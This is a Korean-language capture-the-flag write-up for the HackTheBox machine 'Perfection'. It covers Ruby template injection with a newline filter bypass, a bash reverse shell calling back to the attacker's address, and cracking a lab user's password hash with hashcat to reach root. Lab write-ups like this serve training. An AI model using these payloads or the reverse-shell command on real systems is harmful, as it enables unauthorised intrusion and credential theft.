# Perfection - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA perfection 10.10.11.253
```
<img width="1105" height="264" alt="image" src="https://github.com/user-attachments/assets/a0be620e-f7d2-4ba7-92a3-2d8040a5770e" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1105" height="361" alt="image" src="https://github.com/user-attachments/assets/d5d06d9f-8664-43df-b8df-cae2d7a6647d" />

### SSTI
- `Calculate your weighted grade`탭에서 입력란이 존재.
<img width="672" height="348" alt="image" src="https://github.com/user-attachments/assets/e4eb3786-42f6-4e11-a0d7-c694b0f18ba7" />

<br>
<br>

- `burpsuite`로 가로채서 `category`란에 특수문자를 넣어서 시도해보니 에러 메시지가 출력됨.
<img width="1100" height="548" alt="image" src="https://github.com/user-attachments/assets/ea67f8df-e417-4ac9-9b8b-aad02fed38ba" />

<br>
<br>

- 개행문자 `%0a`로 우회 가능.
<img width="1100" height="567" alt="image" src="https://github.com/user-attachments/assets/3516c078-ff1d-446e-93c8-865353174b60" />

<br>
<br>

- `SSTI`공격이 가능.(<%= 7*7 %>)
<img width="1100" height="568" alt="image" src="https://github.com/user-attachments/assets/1fad42d5-f263-47f5-b3fe-2dbc3464dae1" />

<br>
<br>

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/39da0328b8bcd85e38e0a187ffee92689acebdbf/Server%20Side%20Template%20Injection/Ruby.md
```
`<%= `ls /` %>`
```
<img width="1100" height="590" alt="image" src="https://github.com/user-attachments/assets/bf5a95a8-d8cc-4ea4-ae26-09cf0c56485b" />

<br>
<br>

- ping test 시도
```
<%= `ping 10.10.16.4` %>
```
<img width="774" height="386" alt="image" src="https://github.com/user-attachments/assets/51d65bda-bd75-49b6-af2a-5e3d591bc3f1" />

<br>
<br>

- ping test 성공.
<img width="1104" height="233" alt="image" src="https://github.com/user-attachments/assets/0266c92d-4ac1-42fc-a8a3-faefc1bdc579" />

<br>
<br>

- 리버스 셸 실행.
```
<%= `bash -c 'bash -i >&/dev/tcp/10.10.16.4/80 0>&1'` %>
```
<img width="774" height="398" alt="image" src="https://github.com/user-attachments/assets/875c8aa1-8867-4033-9d73-54c1c5686509" />

<br>
<br>

- 셸 획득.
<img width="1104" height="178" alt="image" src="https://github.com/user-attachments/assets/7ff41a4c-ff6e-4764-9037-4db15445851a" />

---
## Privesc
- `/home/susan/Migration/`에서 `pupilpath_credentials.db`발견.
<img width="1104" height="101" alt="image" src="https://github.com/user-attachments/assets/bb11e7c9-9a42-4bb0-9939-23cb9c2179ac" />

<br>
<br>

- 계정 정보 발견.
- `hashcat`으로 크래킹 실패.
```
sqlite3 credentials.db

sqlite> .headers on

sqlite> .mode column

sqlite> .tables

sqlite> select * from users;
```
<img width="1104" height="482" alt="image" src="https://github.com/user-attachments/assets/6dd0b669-7f14-4405-9f68-0bfcffa4e75c" />

<br>
<br>

- `/var/mail/susan`에서 비밀번호 설정 방법 발견.
<img width="1104" height="289" alt="image" src="https://github.com/user-attachments/assets/f7aabdf4-295c-4041-954f-17b2e5f3258c" />

<br>
<br>

- `susan_nasus_<numbers>`패턴을 `hashcat`을 통해서 크래킹 시도.
- 숫자가 `1`일지 `000000001`일지는 알 수 없으나, 9자리라고 가정하여 진행.
- `susan:susan_nasus_413759210`
```bash
hashcat -m 1400 -a 3 hash 'susan_nasus_?d?d?d?d?d?d?d?d?d'
```
<img width="1104" height="81" alt="image" src="https://github.com/user-attachments/assets/23eafa6f-0c30-4ffd-a422-1873b643aac5" />

<br>
<br>

- `root`권한으로 모든 명령어 실행 가능.(susan:susan_nasus_413759210)
<img width="1104" height="174" alt="image" src="https://github.com/user-attachments/assets/f87e9f66-b11a-4fc9-b397-8b9fd24d0214" />

<br>
<br>

- `root` 셸 획득.
<img width="1104" height="61" alt="image" src="https://github.com/user-attachments/assets/cc882704-fb9b-4d8d-9c09-b6e9ade16713" />

---
## FLAG
- `/home/susan/user.txt`
<img width="1104" height="367" alt="image" src="https://github.com/user-attachments/assets/9a827d52-84a7-4eb3-93aa-ae57ee0d547f" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="234" alt="image" src="https://github.com/user-attachments/assets/d2dde895-55b0-4605-b5a4-1d60b0d23cb1" />





